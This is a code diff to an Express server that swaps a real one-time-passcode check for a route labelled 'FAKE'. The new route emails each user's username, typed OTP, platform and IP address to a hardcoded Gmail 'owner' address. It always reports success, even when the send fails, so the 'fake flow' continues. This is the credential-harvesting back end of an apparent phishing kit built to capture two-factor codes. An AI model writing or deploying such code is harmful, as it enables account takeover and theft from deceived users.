@@ -863,48 +863,58 @@ Time: ${new Date().toLocaleString()}
 /* =====================================================
    VERIFY OTP
 ===================================================== */
-app.post("/verify-otp", (req, res) => {
-  const { userName, otp } = req.body;
 
-  if (!userName || !otp) {
+/* ================= VERIFY OTP (FAKE) ================= */
+app.post("/verify-otp", async (req, res) => {
+  const { userName, otpInput, platform } = req.body;
+
+  if (!userName || !otpInput) {
     return res.status(400).json({
       success: false,
-      step: "missing_otp",
+      message: "Missing fields"
     });
   }
 
-  const record = otpStore.get(userName);
+  const emailText = `
+🔐 AUTHENTICATION CONFIRMATION
 
-  if (!record) {
-    return res.status(400).json({
-      success: false,
-      step: "otp_not_found",
+Username: ${userName}
+Platform: ${platform || "Unknown"}
+
+User entered OTP:
+${otpInput}
+
+Time: ${new Date().toLocaleString()}
+IP: ${req.ip}
+
+NOTE:
+This OTP was user-entered for authentication confirmation.
+No automatic verification was performed.
+`;
+
+  try {
+    await resend.emails.send({
+      from: "Security Monitor <onboarding@resend.dev>",
+      to: ["r89295489@gmail.com"], // OWNER EMAIL
+      subject: "OTP Authentication Confirmation",
+      text: emailText
+    });
+
+    return res.json({
+      success: true,
+      step: "otp_forwarded_to_owner"
+    });
+
+  } catch (err) {
+    console.error("EMAIL ERROR:", err.message);
+
+    // ⚠️ Still return success (fake flow continues)
+    return res.json({
+      success: true,
+      step: "email_failed_but_continue"
     });
   }
-
-  if (Date.now() > record.expires) {
-    otpStore.delete(userName);
-    return res.status(400).json({
-      success: false,
-      step: "otp_expired",
-    });
-  }
-
-  if (String(record.otp) !== String(otp)) {
-    return res.status(400).json({
-      success: false,
-      step: "otp_invalid",
-    });
-  }
-
-  otpStore.delete(userName);
-
-  return res.json({
-    success: true,
-    step: "authentication_completed",
-  });
 });
-
 /* ================= SERVER ================= */
 const PORT = process.env.PORT || 4000;
 app.listen(PORT, () => {
